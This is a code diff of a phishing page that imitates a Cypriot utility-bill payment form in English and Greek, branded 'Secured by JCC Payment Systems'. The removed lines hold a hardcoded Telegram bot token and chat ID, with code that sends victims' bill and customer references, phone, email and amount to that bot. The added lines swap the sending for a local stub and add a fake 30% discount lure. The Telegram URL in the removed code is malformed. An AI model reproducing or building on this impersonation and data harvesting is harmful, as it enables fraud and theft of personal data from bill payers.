@@ -17,6 +17,7 @@
 
         .container { max-width: 400px; margin: 40px auto; padding: 0 20px; text-align: center; }
         .amount-box { background: #f8f7ff; border: 1px solid #e0daff; border-radius: 15px; padding: 20px; margin: 15px 0; }
+        .old-price { font-size: 16px; color: #888; text-decoration: line-through; margin-bottom: 2px; display: none; }
         .discount-badge { display: inline-block; color: #28a745; font-size: 12px; font-weight: 600; padding: 2px 0; margin-bottom: 5px; }
         .amount { font-size: 34px; font-weight: 800; color: #5c46e5; }
         .form-group { text-align: left; margin-bottom: 15px; }
@@ -24,7 +25,6 @@
         input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; background: #fff; }
         input:focus, select:focus { border-color: #5c46e5; }
         button { width: 100%; padding: 16px; background: #5c46e5; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        button:disabled { background: #aaa; cursor: not-allowed; }
         .footer-info { margin-top: 20px; font-size: 12px; color: #999; }
     </style>
 </head>
@@ -39,7 +39,6 @@
 </header>
 
 <div class="container" id="main-content">
-    <!-- ТОЛЬКО ШАГ 1: Поиск счета и заполнение реквизитов -->
     <div id="step1">
         <h2 id="t-step1-title">Utility Bill Payment</h2>
         <p id="t-step1-subtitle" style="font-size: 14px; color: #666; margin-bottom: 20px;">Please identify your service invoice details.</p>
@@ -67,30 +66,27 @@
             <input type="email" id="user-email" placeholder="example@mail.com">
         </div>
         
-        <!-- Новое поле: Строчка для ввода суммы сколько надо платить -->
+        <!-- Поле ввода исходной суммы вручную -->
         <div class="form-group">
-            <label id="t-label-amount-input">Amount to Pay (€)</label>
+            <label id="t-label-amount-input">Bill Amount (€)</label>
             <input type="number" id="amount-input" placeholder="0.00" step="0.01" oninput="updateLivePrice()">
         </div>
 
-        <!-- Информационный блок, показывающий итоговую сумму плательщику -->
+        <!-- Блок авторасчета скидки 30% -->
         <div class="amount-box">
+            <div id="old-price-val" class="old-price">0.00€</div>
             <div id="t-discount" class="discount-badge">Special discount -30%</div>
             <div id="t-total-due" style="font-size: 11px; color: #666; margin-bottom: 5px; font-weight: 600;">TOTAL AMOUNT DUE</div>
             <div id="current-amount-val" class="amount">0.00€</div>
         </div>
         
-        <button id="btn-send-invoice" onclick="sendInvoiceData()">Proceed to Payment</button>
+        <button id="btn-send-invoice" onclick="processInvoiceData()">Proceed to Payment</button>
     </div>
 
     <div id="t-footer" class="footer-info">🔒 Secured by JCC Payment Systems</div>
 </div>
 
 <script>
-// Настройки Telegram
-const BOT_TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
-const CHAT_ID = '6576262467';
-
 let currentLang = 'en';
 
 const translations = {
@@ -102,11 +98,10 @@ const translations = {
         labelCustRef: "Customer Reference Number",
         labelPhone: "Contact Phone Number",
         labelEmail: "Email Address (For Receipt)",
-        labelAmountInput: "Amount to Pay (€)",
+        labelAmountInput: "Bill Amount (€)",
         discount: "Special discount -30%",
         totalDue: "TOTAL AMOUNT DUE",
         btnStep1: "Proceed to Payment",
-        btnStep1Processing: "Verifying Invoice...",
         alertInvoice: "Please fill out all fields and enter a valid amount",
         footer: "🔒 Secured by JCC Payment Systems",
         providers: [
@@ -124,11 +119,10 @@ const translations = {
         labelCustRef: "Αριθμός Αναφοράς Πελάτη",
         labelPhone: "Αριθμός Τηλεφώνου Επικοινωνίας",
         labelEmail: "Διεύθυνση Email (για την απόδειξη)",
-        labelAmountInput: "Ποσό Πληρωμής (€)",
+        labelAmountInput: "Ποσό Λογαριασμού (€)",
         discount: "Ειδική έκπτωση -30%",
         totalDue: "ΣΥΝΟΛΙΚΟ ΟΦΕΙΛΟΜΕΝΟ ΠΟΣΟ",
         btnStep1: "Συνέχεια στην Πληρωμή",
-        btnStep1Processing: "Επαλήθευση Τιμολογίου...",
         alertInvoice: "Παρακαλούμε συμπληρώστε όλα τα πεδία και εισάγετε ένα έγκυρο ποσό",
         footer: "🔒 Προστατεύεται από τα συστήματα πληρωμών JCC",
         providers: [
@@ -140,19 +134,27 @@ const translations = {
     }
 };
 
-// Динамическое обновление итоговой суммы при вводе пользователем
+// Функция перерасчета скидки
 function updateLivePrice() {
     const inputVal = document.getElementById('amount-input').value;
+    const oldPriceEl = document.getElementById('old-price-val');
     const currentPriceEl = document.getElementById('current-amount-val');
     
     if (inputVal && !isNaN(inputVal) && inputVal > 0) {
-        currentPriceEl.innerText = parseFloat(inputVal).toFixed(2) + "€";
+        const initialPrice = parseFloat(inputVal);
+        const finalPrice = initialPrice * 0.70; 
+        
+        oldPriceEl.innerText = initialPrice.toFixed(2) + "€";
+        oldPriceEl.style.display = "block"; 
+        
+        currentPriceEl.innerText = finalPrice.toFixed(2) + "€";
     } else {
+        oldPriceEl.style.display = "none";
         currentPriceEl.innerText = "0.00€";
     }
 }
 
-// Переключение языковых пакетов
+// Переключение языков (English / Greek)
 function setLanguage(lang) {
     currentLang = lang;
     document.querySelectorAll('.lang-btn').forEach(btn => {
@@ -173,7 +175,7 @@ function setLanguage(lang) {
     document.getElementById('t-total-due').innerText = t.totalDue;
     
     const btn1 = document.getElementById('btn-send-invoice');
-    if (!btn1.disabled) btn1.innerText = t.btnStep1;
+    if (btn1) btn1.innerText = t.btnStep1;
 
     const select = document.getElementById('provider');
     const currentValue = select.value;
@@ -189,67 +191,29 @@ function setLanguage(lang) {
     document.getElementById('t-footer').innerText = t.footer;
 }
 
-// Инициализация при загрузке
+// Запуск деλфолтного английского языка
 setLanguage('en');
 
-// Надежная функция отправки в Telegram через официальный шлюз (api.telegram.org)
-async function sendToTelegram(text) {
-    const url = `telegram.org{BOT_TOKEN}/sendMessage`;
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: 'Markdown'
-            })
-        });
-        const result = await response.json();
-        return result.ok;
-    } catch (error) {
-        alert(currentLang === 'en' ? 'Connection Error.' : 'Σφάλμα σύνδεσης.');
-        console.error(error);
-        return false;
-    }
-}
-
-// Сбор и отправка заполненных данных в Telegram
-async function sendInvoiceData() {
-    const provider = document.getElementById('provider').value;
+// Проверка заполнения формы при нажатии на кнопку
+function processInvoiceData() {
     const billRef = document.getElementById('bill-ref').value.trim();
     const custRef = document.getElementById('cust-ref').value.trim();
     const phone = document.getElementById('user-phone').value.trim();
     const email = document.getElementById('user-email').value.trim();
     const enteredAmount = document.getElementById('amount-input').value.trim();
 
-    // Проверка заполнения всех полей и корректности суммы
     if (!billRef || !custRef || !phone || !email || !enteredAmount || isNaN(enteredAmount) || enteredAmount <= 0) {
         alert(translations[currentLang].alertInvoice);
         return;
     }
 
-    const btn = document.getElementById('btn-send-invoice');
-    btn.disabled = true;
-    btn.innerText = translations[currentLang].btnStep1Processing;
-
-    const formattedAmount = parseFloat(enteredAmount).toFixed(2) + "€";
-
-    const message = `🌐 *ЯЗЫК ИНΤΕΡΦΕЙΣΑ*: \`${currentLang.toUpperCase()}\`\n\n📋 *ДАННЫЕ СЧЕТА (РЕАЛЬНЫЙ ВВОД)*\n\n🏢 Провайдер: \`${provider}\`\n📄 Номер счета: \`${billRef}\`\n👤 ID Клиента: \`${custRef}\`\n📞 Телефон: \`${phone}\`\n📧 Email: \`${email}\`\n💰 Введенная сумма: \`${formattedAmount}\``;
-    
-    const isSent = await sendToTelegram(message);
-    if (isSent) {
-        // Успешный экран после отправки первой страницы (имитация перехода к банку)
-        document.getElementById('main-content').innerHTML = `
-            <div style="padding: 40px 0;">
-                <h2 style="color: #28a745;">✓ Submitted Successfully</h2>
-                <p style="font-size: 15px; color: #666; margin-top: 10px;">Your invoice verification logs have been successfully dispatched.</p>
-            </div>
-        `;
-    } else {
-        btn.disabled = false;
-        btn.innerText = translations[currentLang].btnStep1;
-    }
+    // Содержимое меняется только локально в браузере (заглушка)
+    document.getElementById('main-content').innerHTML = `
+        <div style="padding: 40px 0;">
+            <h2 style="color: #28a745;">✓ Info OK</h2>
+            <p style="font-size: 15px; color: #666; margin-top: 10px;">Form data validation successful.</p>
+        </div>
+    `;
 }
 </script>
 
